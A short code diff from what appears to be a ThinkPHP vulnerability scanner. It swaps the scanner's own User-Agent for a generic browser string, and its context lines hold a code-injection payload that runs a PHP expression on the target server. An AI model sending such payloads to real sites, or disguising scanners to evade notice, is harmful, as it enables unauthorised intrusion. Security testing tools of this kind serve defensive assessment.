@@ -8,7 +8,7 @@ import requests
 from utils import get_pocdict
 
 headers = {
-    "User-Agent": "TPscan",
+    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
 }
 
 payload1 = "index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]"
